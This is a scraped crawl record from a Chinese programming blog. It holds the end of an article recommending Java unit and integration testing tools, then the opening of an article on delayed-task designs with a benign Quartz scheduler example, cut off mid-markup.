等持续集成工具，在构建阶段自动运行。</p>\n<p>如果还有人对程序员是否应该关注自动化测试存有疑问，那么让我来回答，随着 DevOps 理念的增强和角色的涌现，自动化测试的重要性正在呈指数型增长。</p>\n<p>企业通常青睐那种擅长编写单元测试的程序员，这些程序员对各种单元测试框架、库和工具有着丰富的知识，比如 JUnit，Selenium，REST-Assured，Spock 框架等。</p>\n<p>作为 Java 程序员，我们在截然不同的领域工作，从编写 Java 核心代码到 JSP 页面，REST API，甚至有时为了构建自动化而去编写 Groovy 脚本，这就要求我们必需了解不同的自动化测试工具。</p>\n<p>举一个例子，很长一段时间内，我只了解 JUnit，但当不得不测试 JSP 页面时，我却束手无策，直到我找到了 Selenium。REST Assured 是另一个类似的例子，我通常使用 curl 命令测试 REST API，但 REST Assured 将 REST API 的单元测试水平提升到了另一个层次。</p>\n<h2>Java 程序员需要用到十大单元测试和自动化集成测试工具</h2>\n<p>我认为一个优秀的程序员，必然能够很好地利用手头上的工具，因此我总在业余时间学习和探索新的工具和库，以下列表是我部分研究成果。</p>\n<p>在这篇文章中，我将分享 10 个最为优秀且必不可少的工具，框架和库，这些可以帮助 java 程序员在各类 java 项目中编写单元测试和集成测试。</p>\n<h3>JUnit</h3>\n<p>JUnit 无须赘述，即便是初级Java程序员，可能也已经听说过它，你可以使用它编写 Java 代码的单元测试。</p>\n<p>几乎所有主流 IDE，例如 Eclipse，NetBeans 和 IntelliJ，都集成了 JUnit，可以直接在这些IDE中编写和运行单元测试。</p>\n<p>大多数人仍在使用 JUnit 4，即使 JUnit 5 已经发布，它很可能是今年下一个热点。通过 JUnit 5，可以将 JUnit 同时应用于单元测试和集成测试，并且它还支持 Java 8 的特性。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/04/8e5c05d6729665c7b55a0be0128a4e3b.png\"><img class=\"aligncenter wp-image-67496 size-full\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/8e5c05d6729665c7b55a0be0128a4e3b.png\" alt=\"junit5 architecture testing\" width=\"320\" height=\"255\"></a></p>\n<h3>REST Assured</h3>\n<p>用 Java 语言测试和验证 REST 服务，要难于 Groovy 这类动态语言。</p>\n<p>REST Assured 将这类语言的易用性带入了 Java 领域，是一个优秀的 REST API 的集成测试工具。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/04/83fb827ae23afa4c0fcae32470debac2.jpg\" rel=\"https://www.udemy.com/api-testing-rest-api-automation-testing-from-scratch/?siteID=JVFxdTr9V80-BmKRpLLolCUb.AGrEBG9sg&amp;LSNPUBID=JVFxdTr9V80\"><img class=\"aligncenter wp-image-67500 size-full\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/83fb827ae23afa4c0fcae32470debac2.jpg\" alt=\"REST assured testing Restful web application\" width=\"400\" height=\"226\"></a></p>\n<h3>Selenium</h3>\n<p>Selenium 很可能是最流行的 Java UI 测试工具了，它可以让你在不必启动浏览器的情况下测试 JSP 页面。</p>\n<p>你可以使用 JUnit 和 Selenium 来测试 Web 程序的界面，它甚至允许你编写 Web 应用程序的验收测试。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/04/01641d464ff195a39f2e613020446df9.jpg\"><img class=\"aligncenter wp-image-67487 size-full\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/01641d464ff195a39f2e613020446df9.jpg\" alt=\"selenium-webdriver-with-java-basics-advance-archit\" width=\"1280\" height=\"720\"></a></p>\n<h3>TestNG</h3>\n<p>TestNG 是一个测试框架，其灵感来自 JUnit 和 NUnit，但同时引入了一些新的功能，使其功能更强大，使用更方便。例如可以使用注解，在任意大的线程池中，配置各种可用策略进行测试（例如所有方法都在自己的线程中，每一个测试类使用一个线程等）。</p>\n<p>因为 TestNG 使用 JUnit 4 的注解，同时又集成了 HAMCSTREST 匹配器，它与 JUnit 的差异已经减小了，但两者如何选择，这取决于你。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/04/58bb4c4068e8326c80735dfd0d1f430a.png\"><img class=\"alignnone size-full wp-image-67501 aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/58bb4c4068e8326c80735dfd0d1f430a.png\" alt=\"TestNG framework\" width=\"400\" height=\"270\"></a></p>\n<h3>Mockito</h3>\n<p>Java 类有许多 Mock 框架，例如 PowerMock 和 JMock，但我个人偏向于 <a href=\"http://site.mockito.org/\">Mockito</a>，因为它有简单的 API，优秀的文档以及大量的示例。</p>\n<p>Mocking 是现代单元测试的一项关键技术，因为它允许你在没有任何依赖的情况下独立测试代码，这就是为什么我鼓励每个 Java 程序员在学习 JUnit 的同时，一起学习 Mocking 框架的原因。</p>\n<p>我最喜欢的 mocking 框架是 Mockito，但如果你愿意，也可以研究下 PowerMock 或 JMock。</p>\n<h3>Spock框架</h3>\n<p>Spock 是另一个测试和规范框架，用于 Java 和 Groovy 应用程序。由于使用 Groovy 编写，Spock 成为一种兼具丰富表现力且简明扼要的规范语言。</p>\n<p>当你使用 Spock 时，你的测试将变得更容易阅读和维护，这得益于它采用的 JUnit 运行器，Spock 兼容大部分 IDE，构建工具和持续集成服务器。</p>\n<p>可惜我没有找到有助于学习 Spock 框架的课程，但阅读《<a href=\"https://www.amazon.com/Java-Testing-Spock-Konstantinos-Kapelonis/dp/1617292532\">Java Testing with Spock</a>》这本书是很好的开始。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/04/7d9d4a5f78beba6c942d1ee0a60065ec.jpg\"><img class=\"aligncenter size-full wp-image-67499\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/7d9d4a5f78beba6c942d1ee0a60065ec.jpg\" alt=\"Java Testing with Spock\" width=\"254\" height=\"320\"></a></p>\n<h3>Cucumber</h3>\n<p>Cucumber 是另一个重要的自动化集成测试工具，但与其它同类别的工具不同的是它能够针对规格文档进行自动化测试。</p>\n<p>Cucumber 将规格文档和测试文档合成整个动态文档，同时 Cucumber 自动测试这个文档，使测试规范始终保持在最新版本。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/04/2253469cb78a9de143e0ff56c5bee12f.png\"><img class=\"aligncenter size-full wp-image-67498\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/2253469cb78a9de143e0ff56c5bee12f.png\" alt=\"Cucumber testing framework 2\" width=\"400\" height=\"195\"></a></p>\n<h3>Spring Test</h3>\n<p>Spring MVC 自带一个很有用的测试框架，它可以在不引入 Web 容器的情况下进行深入测试。</p>\n<p>Spring Test 是为 Spring 程序编写自动化测试的最有用的库之一。为了给 Spring 驱动的应用程序（包括 MVC 控制器在内），编写单元测试和集成测试，Spring Test 提供了一流的支持。</p>\n<p>另外，Spring Test DbUnit 集成了 Spring Test 框架与 DbUnit；Spring Test MVC HtmlUnit 集成了Spring Test MVC 框架和 HtmlUnit。</p>\n<p>通过使用这些工具，你可以轻松地自动测试 Spring MVC 应用程序。</p>\n<h3>DBUnit</h3>\n<p>数据库是许多 Java 应用程序，包括核心 Java 和 Web 应用程序中不可或缺的部分，也有可能是单元测试的最大障碍。</p>\n<p>在进行集成测试时，连接开发环境或用户验收测试的数据库并不可靠，因为任何人都可以更改数据模式和数据本身，例如表和存储过程等，这会导致自动化集成测试失败。</p>\n<p>DbUnit 是一个 JUnit 扩展，每次集成测试前，将数据库初始化成已知状态，确保数据库存储正确的数据。</p>\n<p>DbUnit 自身还存在着一些问题，但它是一个非常有用的工具，因为它可以帮助我们分离测试数据与测试代码。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/04/e86c20da61db52957e6e4f87c7a25b65.png\"><img class=\"aligncenter size-full wp-image-67502\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/e86c20da61db52957e6e4f87c7a25b65.png\" alt=\"Unit testing of database using DBUnit\" width=\"366\" height=\"400\"></a></p>\n<h3>Robot 框架</h3>\n<p>Robot 框架是一个基于 Python 的通用测试自动化框架，用于验收测试和验收测试驱动开发。</p>\n<p>它是一个由关键字驱动的，使用表格测试数据语法的测试框架，可以用来测试那些涉及多种技术和接口的分布式异构应用。</p>\n<p>如果你打算学习这个优秀的集成测试框架，那么你可以从 Udemy 上的《<a href=\"https://www.udemy.com/robot-framework-level-1/?siteID=JVFxdTr9V80-fviC4FKz0NBU7fs4fjXA6A&amp;LSNPUBID=JVFxdTr9V80\">Robot 框架测试自动化</a>》的课程开始，这是一个很好的学习资源。</p>\n<p>该课程涵盖了两部分内容，Robot 框架基础和高级特性。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/04/6b6e14053b953291f679a7bd7e456d51.png\"><img class=\"aligncenter size-full wp-image-67497\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/6b6e14053b953291f679a7bd7e456d51.png\" alt=\"accept test report using robot framework\" width=\"400\" height=\"238\"></a></p>\n<h3>结论</h3>\n<p>以上列举了Java 程序员需要用到的单元测试和集成测试工具，框架和库。</p>\n<p>还有很多库没有包括在这个列表中，例如 AssertJ 和 Hamcrest，它们可以帮助你写出漂亮且流畅的测试，但学习需要一步步来。</p>\n<p>首先，学习一个可以应用于日常工作的工具或库。 例如，如果你正在使用 Java UI，那么首先应该学习 Selenium，这样你可以有更多时间专注在这个工具上。</p>\n<p>同样的，如果你的工作内容是 REST API，请学习 REST Assured（参阅 <a href=\"http://www.baeldung.com/rest-with-spring-course?utm_source=javarevisited&amp;utm_medium=web&amp;utm_campaign=rws&amp;affcode=22136_bkwjs9xa\">REST with Spring</a>）；如果你正在做很多核心 Java 的工作，那么 JUnit 5 可能是你首先需要关注的库。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113952\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113952votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113952\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx1615593136\">搬砖大师傅</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx1615593136\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/5711ded56e938ec03969c82191310ba3.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            对大数据，金融IT开发有兴趣，对量化交易有兴趣        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/wx1615593136\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/wx1615593136/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/wx1615593136/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 10</a> · <a title=\"QQ：248194560\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：Rocky719\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "工具与资源,Groovy,java,JUnit", "url": "http://blog.jobbole.com/113952/", "url_obj_id": "41201d7935af5be0d5b31cfa94a23f85"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/03/4bae6998d00f180d42c7da716e3d0bb2.jpg"], "title": "分布式之延时任务方案解析", "create_date": "2018/05/20 ·", "praise_num": 2, "fav_num": 5, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/rjzheng/p/8972725.html\">孤独烟</a>   </div><h2 id=\"引言\">引言</h2>\n<p>在开发中，往往会遇到一些关于延时任务的需求。例如</p>\n<ul>\n<li>生成订单30分钟未支付，则自动取消</li>\n<li>生成订单60秒后,给用户发短信</li>\n</ul>\n<p>对上述的任务，我们给一个专业的名字来形容，那就是<strong>延时任务</strong>。那么这里就会产生一个问题，这个<strong>延时任务</strong>和<strong>定时任务</strong>的区别究竟在哪里呢？一共有如下几点区别</p>\n<ol>\n<li>定时任务有明确的触发时间，延时任务没有</li>\n<li>定时任务有执行周期，而延时任务在某事件触发后一段时间内执行，没有执行周期</li>\n<li>定时任务一般执行的是批处理操作是多个任务，而延时任务一般是单个任务</li>\n</ol>\n<p>下面，我们以判断订单是否超时为例，进行方案分析</p>\n<h2 id=\"方案分析\">方案分析</h2>\n<h3 id=\"数据库轮询\">(1)数据库轮询</h3>\n<h4 id=\"思路\">思路</h4>\n<p>该方案通常是在小型项目中使用，即通过一个线程定时的去扫描数据库，通过订单时间来判断是否有超时的订单，然后进行update或delete等操作</p>\n<h4 id=\"实现\">实现</h4>\n<p>博主当年早期是用quartz来实现的(实习那会的事)，简单介绍一下<br>\nmaven项目引入一个依赖如下所示</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93035899511616094\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n    &lt;dependency&gt;\r\n        &lt;groupId&gt;org.quartz-scheduler&lt;/groupId&gt;\r\n        &lt;artifactId&gt;quartz&lt;/artifactId&gt;\r\n        &lt;version&gt;2.2.2&lt;/version&gt;\r\n    &lt;/dependency&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93035899511616094-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93035899511616094-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93035899511616094-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93035899511616094-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93035899511616094-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93035899511616094-1\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">dependency</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93035899511616094-2\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">quartz</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">scheduler</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93035899511616094-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">quartz</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93035899511616094-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">2.2.2</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93035899511616094-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dependency</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>调用Demo类MyJob如下所示</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358a3126485606\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npackage com.rjzheng.delay1;\r\n\r\nimport org.quartz.JobBuilder;\r\nimport org.quartz.JobDetail;\r\nimport org.quartz.Scheduler;\r\nimport org.quartz.SchedulerException;\r\nimport org.quartz.SchedulerFactory;\r\nimport org.quartz.SimpleScheduleBuilder;\r\nimport org.quartz.Trigger;\r\nimport org.quartz.TriggerBuilder;\r\nimport org.quartz.impl.StdSchedulerFactory;\r\nimport org.quartz.Job;\r\nimport org.quartz.JobExecutionContext;\r\nimport org.quartz.JobExecutionException;\r\n\r\npublic class MyJob implements Job {\r\n    public void execute(JobExecutionContext context)\r\n            throws JobExecutionException {\r\n        System.out.println(\"要去数据库扫描啦。。。\");\r\n    }\r\n\r\n    public static void main(String[] args) throws Exception {\r\n        // 创建任务\r\n        JobDetail jobDetail = JobBuilder.newJob(MyJob.class)\r\n                .withIdentity(\"job1\", \"group1\").build();\r\n        // 创建触发器 每3秒钟执行一次\r\n        Trigger trigger = TriggerBuilder\r\n                .newTrigger()\r\n                .withIdentity(\"trigger1\", \"group3\")\r\n                .withSchedule(\r\n                        SimpleScheduleBuilder.simpleSchedule()\r\n                                .withIntervalInSeconds(3).repeatForever())\r\n                .build();\r\n        Scheduler scheduler = new StdSchedulerFactory().getScheduler();\r\n        // 将任务及其触发器放入调度器\r\n        scheduler.scheduleJob(jobDetail, trigger);\r\n        // 调度器开始调度任务\r\n        scheduler.start();\r\n    }\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358a3126485606-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a3126485606-41\">41</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-1\"><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rjzheng</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">delay1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-3\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">quartz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">JobBuilder</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-4\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">quartz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">JobDetail</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-5\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">quartz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Scheduler</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-6\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">quartz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SchedulerException</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-7\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">quartz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SchedulerFactory</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-8\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">quartz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SimpleScheduleBuilder</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-9\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">quartz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Trigger</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-10\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">quartz</span><span class=\"crayon-sy\">.</span><span 